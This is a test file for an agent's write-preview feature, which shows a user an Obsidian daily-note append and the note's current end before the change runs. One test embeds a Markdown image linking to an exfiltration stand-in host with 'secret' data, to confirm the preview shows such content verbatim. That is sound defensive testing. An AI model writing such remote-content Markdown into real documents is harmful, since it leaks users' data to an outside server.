// Phase 9.7 B4b: the typed preview and the before-reader of the Obsidian daily-note append (plan
// R2 row 4, R3). The template keys are exactly the append's input-schema keys in
// `@nimbus-dev/connectors` 0.5.0 (`connectors/obsidian/src/tools.ts` `appendDailyNoteSchema`).
import { describe, expect, test } from "bun:test";

import { serviceOf } from "../../engine/service-of.ts";
import { mcpClientToolKey } from "../lazy-mesh/tool-map.ts";
import { BEFORE_EXCERPT_MAX_CHARS, codePointLength } from "./before-select.ts";
import { CONNECTOR_WRITE_ROWS } from "./index.ts";
import { selectObsidianDailyNote } from "./knowledge.ts";
import { isModelOfferableRow } from "./model-offerable.ts";
import {
  buildConnectorWritePreviewFrom,
  type ConnectorWritePreview,
  renderConnectorWritePreviewLines,
} from "./preview.ts";
import { type ConnectorWriteRow, previewTemplateKeys } from "./types.ts";

const ID = "obsidian_append_to_daily_note";

function rowOf(): ConnectorWriteRow {
  const r = CONNECTOR_WRITE_ROWS.find((x) => x.toolId === ID);
  if (r === undefined) throw new Error("no obsidian row");
  return r;
}

function previewOf(input: Record<string, unknown>): ConnectorWritePreview {
  const r = rowOf();
  const p = buildConnectorWritePreviewFrom(
    {
      type: r.actionType,
      origin: "model",
      payload: { mcpToolId: mcpClientToolKey(serviceOf(r.actionType), ID), input },
    },
    CONNECTOR_WRITE_ROWS,
    () => "personal",
  );
  if (p === undefined) throw new Error("no preview");
  return p;
}

/** The real MCP reply shape: one text content block holding the JSON. */
function mcp(body: unknown): unknown {
  return { content: [{ type: "text", text: JSON.stringify(body) }] };
}

const NOTE = {
  vault_id: "0123456789ab",
  vault_name: "Work",
  path: "Daily/2026-11-05.md",
  exists: true,
  size_bytes: 42,
  tail: "- [ ] ship B4b\n",
};

describe("the Obsidian append's typed preview (R2 row 4)", () => {
  test("mesh, wave 2, templated and offerable; no wave-2 row is left without a template", () => {
    const r = rowOf();
    expect(r.transport).toBe("mesh");
    expect(r.wave).toBe(2);
    expect(isModelOfferableRow(r)).toBe(true);
    expect(
      CONNECTOR_WRITE_ROWS.filter((x) => x.wave === 2 && !isModelOfferableRow(x)).map(
        (x) => x.toolId,
      ),
    ).toEqual([]);
  });

  test("golden lines", () => {
    const p = previewOf({ vault_id: "Work", date_iso: "2026-11-05", content: "- [ ] ship B4b" });
    expect(renderConnectorWritePreviewLines(p)).toEqual([
      "Service: obsidian",
      "Credential: personal",
      "Target:  Work",
      "Append to the daily note in Obsidian vault Work; nothing already in the note is changed",
      "",
      '  Vault (id or folder): "Work"',
      '  Daily note date: "2026-11-05"',
      '  Text appended (Markdown, sent as is): "- [ ] ship B4b"',
    ]);
    expect(p.otherFields).toEqual([]);
  });

  test("an unset date shows the connector's real default", () => {
    const p = previewOf({ vault_id: "Work", content: "x" });
    expect(p.fields.find((f) => f.label === "Daily note date")?.value).toBe(
      "(not set: today's date in UTC)",
    );
  });

  test("the content is shown in full and verbatim, remote-content Markdown included", () => {
    const content = `![](https://exfil.example/?d=secret) ${"y".repeat(20_000)}`;
    const p = previewOf({ vault_id: "Work", content });
    expect(p.fields.find((f) => f.label === "Text appended (Markdown, sent as is)")?.value).toBe(
      JSON.stringify(content),
    );
  });

  test("the drift keys equal the 0.5.0 schema keys; every field is text", () => {
    const t = rowOf().preview;
    if (t === undefined) throw new Error("no template");
    expect([...previewTemplateKeys(t)].sort((a, b) => a.localeCompare(b))).toEqual([
      "content",
      "date_iso",
      "vault_id",
    ]);
    for (const f of t.fields) expect(f.kind, f.key).toBe("text");
  });
});

describe("the Obsidian append's before-reader (R3)", () => {
  test("it reads obsidian_daily_note_get with the vault and, when given, the date", () => {
    const b = rowOf().before;
    if (b === undefined) throw new Error("no before");
    expect(b.tool).toBe("obsidian_daily_note_get");
    expect([...b.argKeys]).toEqual(["vault_id", "date_iso"]);
    expect(b.args({ vault_id: "Work", content: "x" })).toEqual({ vault_id: "Work" });
    expect(b.args({ vault_id: "Work", date_iso: "2026-11-05", content: "x" })).toEqual({
      vault_id: "Work",
      date_iso: "2026-11-05",
    });
    expect(b.args({ vault_id: "Work", date_iso: 7 })).toEqual({ vault_id: "Work" });
    expect(b.guard).toBeUndefined();
  });

  test("an existing note: vault, path, exists, length and the end of the note", () => {
    expect(selectObsidianDailyNote(mcp(NOTE))).toEqual([
      { label: "Vault", value: "Work" },
      { label: "Daily note", value: "Daily/2026-11-05.md" },
      { label: "Exists", value: "yes" },
      { label: "Current length", value: "42 bytes (kept)" },
      { label: "Current end", value: "- [ ] ship B4b\n" },
    ]);
  });

  test("a missing note: the append creates it, and the end is (empty)", () => {
    expect(
      selectObsidianDailyNote(mcp({ ...NOTE, exists: false, size_bytes: 0, tail: "" })),
    ).toEqual([
      { label: "Vault", value: "Work" },
      { label: "Daily note", value: "Daily/2026-11-05.md" },
      { label: "Exists", value: "no: the append creates it (and its folder)" },
      { label: "Current length", value: "0 bytes (kept)" },
      { label: "Current end", value: "(empty)" },
    ]);
  });

  test("a 16 KiB tail is capped to its END, at most the excerpt bound plus the marker", () => {
    const tail = `${"a".repeat(16_000)}THE-END`;
    const end = selectObsidianDailyNote(mcp({ ...NOTE, tail })).find(
      (f) => f.label === "Current end",
    )?.value;
    expect(end?.endsWith("THE-END")).toBe(true);
    const marker = `(${String(codePointLength(tail) - BEFORE_EXCERPT_MAX_CHARS)} earlier characters not shown) `;
    expect(end?.startsWith(marker)).toBe(true);
    expect(codePointLength((end ?? "").slice(marker.length))).toBe(BEFORE_EXCERPT_MAX_CHARS);
  });

  test("a tail whose cut falls inside a surrogate pair is cut on a whole code point", () => {
    const astral = String.fromCodePoint(0x1f600);
    const tail = astral.repeat(BEFORE_EXCERPT_MAX_CHARS + 5);
    const end =
      selectObsidianDailyNote(mcp({ ...NOTE, tail })).find((f) => f.label === "Current end")
        ?.value ?? "";
    expect(end.isWellFormed()).toBe(true);
  });

  test("an absent vault_name, path or exists flag throws (the prompt reads unavailable)", () => {
    const { vault_name: _v, ...noName } = NOTE;
    const { path: _p, ...noPath } = NOTE;
    const { exists: _e, ...noExists } = NOTE;
    for (const body of [noName, noPath, noExists]) {
      expect(() => selectObsidianDailyNote(mcp(body))).toThrow();
    }
  });
});
